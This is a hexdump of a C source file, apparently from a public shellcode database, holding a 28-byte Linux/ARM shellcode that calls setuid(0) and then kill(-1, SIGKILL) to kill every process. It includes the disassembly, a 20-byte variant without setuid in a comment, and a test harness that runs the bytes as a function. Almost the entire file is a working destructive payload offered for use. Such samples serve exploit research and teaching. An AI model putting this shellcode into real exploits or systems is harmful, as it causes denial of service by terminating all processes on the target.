00000000  2f 2a 0a 54 69 74 6c 65  3a 20 20 4c 69 6e 75 78  |/*.Title:  Linux|
00000010  2f 41 52 4d 20 2d 20 73  65 74 75 69 64 28 30 29  |/ARM - setuid(0)|
00000020  20 26 20 6b 69 6c 6c 28  2d 31 2c 20 53 49 47 4b  | & kill(-1, SIGK|
00000030  49 4c 4c 29 20 2d 20 32  38 20 62 79 74 65 73 0a  |ILL) - 28 bytes.|
00000040  09 28 4b 69 6c 6c 20 61  6c 6c 20 70 72 6f 63 65  |.(Kill all proce|
00000050  73 73 65 73 29 0a 0a 44  61 74 65 3a 20 20 20 32  |sses)..Date:   2|
00000060  30 31 30 2d 30 36 2d 32  39 0a 54 65 73 74 65 64  |010-06-29.Tested|
00000070  3a 20 41 52 4d 39 32 36  45 4a 2d 53 20 72 65 76  |: ARM926EJ-S rev|
00000080  20 35 20 28 76 35 6c 29  0a 0a 41 75 74 68 6f 72  | 5 (v5l)..Author|
00000090  3a 20 4a 6f 6e 61 74 68  61 6e 20 53 61 6c 77 61  |: Jonathan Salwa|
000000a0  6e 0a 57 65 62 3a 20 20  20 20 68 74 74 70 3a 2f  |n.Web:    http:/|
000000b0  2f 73 68 65 6c 6c 2d 73  74 6f 72 6d 2e 6f 72 67  |/shell-storm.org|
000000c0  20 7c 20 68 74 74 70 3a  2f 2f 74 77 69 74 74 65  | | http://twitte|
000000d0  72 2e 63 6f 6d 2f 6a 6f  6e 61 74 68 61 6e 73 61  |r.com/jonathansa|
000000e0  6c 77 61 6e 0a 0a 21 20  44 61 74 61 62 61 73 65  |lwan..! Database|
000000f0  20 6f 66 20 73 68 65 6c  6c 63 6f 64 65 73 20 68  | of shellcodes h|
00000100  74 74 70 3a 2f 2f 77 77  77 2e 73 68 65 6c 6c 2d  |ttp://www.shell-|
00000110  73 74 6f 72 6d 2e 6f 72  67 2f 73 68 65 6c 6c 63  |storm.org/shellc|
00000120  6f 64 65 2f 0a 0a 0a 20  20 20 20 38 30 35 34 3a  |ode/...    8054:|
00000130  09 65 32 38 66 33 30 30  31 20 09 61 64 64 09 72  |.e28f3001 .add.r|
00000140  33 2c 20 70 63 2c 20 23  31 20 20 20 3b 20 30 78  |3, pc, #1   ; 0x|
00000150  31 0a 20 20 20 20 38 30  35 38 3a 09 65 31 32 66  |1.    8058:.e12f|
00000160  66 66 31 33 20 09 62 78  09 72 33 0a 20 20 20 20  |ff13 .bx.r3.    |
00000170  38 30 35 63 3a 09 31 62  32 34 20 20 20 20 20 20  |805c:.1b24      |
00000180  09 73 75 62 73 09 72 34  2c 20 72 34 2c 20 72 34  |.subs.r4, r4, r4|
00000190  0a 20 20 20 20 38 30 35  65 3a 09 31 63 32 30 20  |.    805e:.1c20 |
000001a0  20 20 20 20 20 09 61 64  64 73 09 72 30 2c 20 72  |     .adds.r0, r|
000001b0  34 2c 20 23 30 0a 20 20  20 20 38 30 36 30 3a 09  |4, #0.    8060:.|
000001c0  32 37 31 37 20 20 20 20  20 20 09 6d 6f 76 73 09  |2717      .movs.|
000001d0  72 37 2c 20 23 32 33 0a  20 20 20 20 38 30 36 32  |r7, #23.    8062|
000001e0  3a 09 64 66 30 31 20 20  20 20 20 20 09 73 76 63  |:.df01      .svc|
000001f0  09 31 0a 20 20 20 20 38  30 36 34 3a 09 31 61 39  |.1.    8064:.1a9|
00000200  32 20 20 20 20 20 20 09  73 75 62 73 09 72 32 2c  |2      .subs.r2,|
00000210  20 72 32 2c 20 72 32 0a  20 20 20 20 38 30 36 36  | r2, r2.    8066|
00000220  3a 09 31 63 31 30 20 20  20 20 20 20 09 61 64 64  |:.1c10      .add|
00000230  73 09 72 30 2c 20 72 32  2c 20 23 30 0a 20 20 20  |s.r0, r2, #0.   |
00000240  20 38 30 36 38 3a 09 33  38 30 31 20 20 20 20 20  | 8068:.3801     |
00000250  20 09 73 75 62 73 09 72  30 2c 20 23 31 0a 20 20  | .subs.r0, #1.  |
00000260  20 20 38 30 36 61 3a 09  32 31 30 39 20 20 20 20  |  806a:.2109    |
00000270  20 20 09 6d 6f 76 73 09  72 31 2c 20 23 39 0a 20  |  .movs.r1, #9. |
00000280  20 20 20 38 30 36 63 3a  09 32 37 32 35 20 20 20  |   806c:.2725   |
00000290  20 20 20 09 6d 6f 76 73  09 72 37 2c 20 23 33 37  |   .movs.r7, #37|
000002a0  0a 20 20 20 20 38 30 36  65 3a 09 64 66 30 31 20  |.    806e:.df01 |
000002b0  20 20 20 20 20 09 73 76  63 09 31 0a 0a 2a 2f 0a  |     .svc.1..*/.|
000002c0  0a 23 69 6e 63 6c 75 64  65 20 3c 73 74 64 69 6f  |.#include <stdio|
000002d0  2e 68 3e 0a 0a 0a 2f 2a  20 6b 69 6c 6c 20 61 6c  |.h>.../* kill al|
000002e0  6c 20 70 72 6f 63 65 73  73 65 73 20 77 69 74 68  |l processes with|
000002f0  6f 75 74 20 73 65 74 75  69 64 28 30 29 20 2d 20  |out setuid(0) - |
00000300  32 30 20 62 79 74 65 73  20 2a 2f 0a 0a 2f 2f 20  |20 bytes */..// |
00000310  63 68 61 72 20 2a 53 43  20 3d 20 22 5c 78 30 31  |char *SC = "\x01|
00000320  5c 78 33 30 5c 78 38 66  5c 78 65 32 22 0a 2f 2f  |\x30\x8f\xe2".//|
00000330  20 20 20 20 20 20 20 20  20 20 20 20 22 5c 78 31  |            "\x1|
00000340  33 5c 78 66 66 5c 78 32  66 5c 78 65 31 22 0a 2f  |3\xff\x2f\xe1"./|
00000350  2f 20 20 20 20 20 20 20  20 20 20 20 20 22 5c 78  |/            "\x|
00000360  39 32 5c 78 31 61 5c 78  31 30 5c 78 31 63 22 0a  |92\x1a\x10\x1c".|
00000370  2f 2f 20 20 20 20 20 20  20 20 20 20 20 20 22 5c  |//            "\|
00000380  78 30 31 5c 78 33 38 5c  78 30 39 5c 78 32 31 22  |x01\x38\x09\x21"|
00000390  0a 2f 2f 20 20 20 20 20  20 20 20 20 20 20 20 22  |.//            "|
000003a0  5c 78 32 35 5c 78 32 37  5c 78 30 31 5c 78 64 66  |\x25\x27\x01\xdf|
000003b0  22 3b 0a 0a 0a 2f 2a 20  6b 69 6c 6c 20 61 6c 6c  |";.../* kill all|
000003c0  20 70 72 6f 63 65 73 73  65 73 20 77 69 74 68 20  | processes with |
000003d0  73 65 74 75 69 64 28 30  29 20 2d 20 32 38 20 62  |setuid(0) - 28 b|
000003e0  79 65 73 20 2a 2f 20 0a  0a 63 68 61 72 20 2a 53  |yes */ ..char *S|
000003f0  43 20 3d 20 22 5c 78 30  31 5c 78 33 30 5c 78 38  |C = "\x01\x30\x8|
00000400  66 5c 78 65 32 22 0a 20  20 20 20 20 20 20 20 20  |f\xe2".         |
00000410  20 20 22 5c 78 31 33 5c  78 66 66 5c 78 32 66 5c  |  "\x13\xff\x2f\|
00000420  78 65 31 22 0a 20 20 20  20 20 20 20 20 20 20 20  |xe1".           |
00000430  22 5c 78 32 34 5c 78 31  62 5c 78 32 30 5c 78 31  |"\x24\x1b\x20\x1|
00000440  63 22 0a 20 20 20 20 20  20 20 20 20 20 20 22 5c  |c".           "\|
00000450  78 31 37 5c 78 32 37 5c  78 30 31 5c 78 64 66 22  |x17\x27\x01\xdf"|
00000460  0a 20 20 20 20 20 20 20  20 20 20 20 22 5c 78 39  |.           "\x9|
00000470  32 5c 78 31 61 5c 78 31  30 5c 78 31 63 22 0a 20  |2\x1a\x10\x1c". |
00000480  20 20 20 20 20 20 20 20  20 20 22 5c 78 30 31 5c  |          "\x01\|
00000490  78 33 38 5c 78 30 39 5c  78 32 31 22 0a 20 20 20  |x38\x09\x21".   |
000004a0  20 20 20 20 20 20 20 20  22 5c 78 32 35 5c 78 32  |        "\x25\x2|
000004b0  37 5c 78 30 31 5c 78 64  66 22 3b 0a 0a 0a 69 6e  |7\x01\xdf";...in|
000004c0  74 20 6d 61 69 6e 28 76  6f 69 64 29 0a 7b 0a 20  |t main(void).{. |
000004d0  20 20 20 20 20 20 20 66  70 72 69 6e 74 66 28 73  |       fprintf(s|
000004e0  74 64 6f 75 74 2c 22 4c  65 6e 67 74 68 3a 20 25  |tdout,"Length: %|
000004f0  64 5c 6e 22 2c 73 74 72  6c 65 6e 28 53 43 29 29  |d\n",strlen(SC))|
00000500  3b 0a 20 20 20 20 20 20  20 20 28 2a 28 76 6f 69  |;.        (*(voi|
00000510  64 28 2a 29 28 29 29 20  53 43 29 28 29 3b 0a 72  |d(*)()) SC)();.r|
00000520  65 74 75 72 6e 20 30 3b  0a 7d                    |eturn 0;.}|
0000052a
